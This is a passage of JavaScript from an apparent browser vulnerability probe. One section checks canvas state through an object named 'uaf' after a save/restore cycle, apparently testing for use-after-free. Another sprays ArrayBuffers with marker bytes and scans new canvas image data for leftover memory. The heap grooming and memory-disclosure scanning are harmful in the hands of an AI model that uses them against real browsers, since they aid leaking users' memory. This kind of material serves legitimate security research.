    for (var r = 0; r < 8; r++) alias.restore();

    alias.save();
    alias.save();

    alias.setLineDash([1,2,3,4,5,6,7,8]);

    var stateStackInfo = {
      saves: 2,
      dashLen: 8
    };
    bk('F-STATE', JSON.stringify(stateStackInfo));

    var readBack = uaf.getLineDash();
    bk('F-READ2', 'len=' + readBack.length + '|v0=' + readBack[0]);
    say('F: after save/restore cycle: len=' + readBack.length);

    runSectionG();
  } catch(e) {
    bk('F-ERR', e.message);
    say('F-ERR: ' + e.message, 'err');
    runSectionG();
  }
}

/* ========== SECTION G: GETIMAGEDATA BITMAP RESIDUE ========== */
function runSectionG() {
  say('\n=== G: BITMAP RESIDUE SCAN ===', 'info');
  try {
    for (var i = 0; i < 100; i++) {
      var ab = new ArrayBuffer(4096);
      var dv = new DataView(ab);
      for (var j = 0; j < 4096; j += 8) dv.setFloat64(j, 3.14159 + j);
    }

    var c = document.createElement('canvas');
    c.width = 256; c.height = 256;
    var ctx = c.getContext('2d');

    var imgData = ctx.getImageData(0, 0, 256, 256);
    var d = imgData.data;
    var nonZero = 0, nonFF = 0;
    for (var i = 0; i < d.length; i += 4) {
      if (d[i] !== 0 || d[i+1] !== 0 || d[i+2] !== 0) nonZero++;
      if (d[i+3] !== 0) nonFF++;
    }
    bk('G-SCAN', 'nz=' + nonZero + '|alpha=' + nonFF);
    say('G: canvas residue nonZero=' + nonZero + ' alpha=' + nonFF, nonZero > 0 ? 'hit' : '');

    for (var s = 0; s < 3; s++) {
      for (var i = 0; i < 50; i++) {
        var ab2 = new ArrayBuffer(256 * 256 * 4);
        var u8 = new Uint8Array(ab2);
        for (var j = 0; j < 64; j++) u8[j] = 0xDE;
      }

      var c2 = document.createElement('canvas');
      c2.width = 256; c2.height = 256;
      var ctx2 = c2.getContext('2d');
      var id2 = ctx2.getImageData(0, 0, 256, 256);
      var nz2 = 0;
      for (var i = 0; i < id2.data.length; i += 4) {
        if (id2.data[i] !== 0 || id2.data[i+1] !== 0 || id2.data[i+2] !== 0) nz2++;
      }
      if (nz2 > 0) {
        bk('G-HIT'+s, 'nz=' + nz2);
        say('G: round ' + s + ' HIT nonZero=' + nz2, 'hit');
        break;
      }
    }

    runDone();
  } catch(e) {
    bk('G-ERR', e.message);
    say('G-ERR: ' + e.message, 'err');
    runDone();
  }
}

function runDone() {
  bk('DONE', 'all-sections-complete');
  say('\n=== P1081 COMPLETE ===', 'info');
}
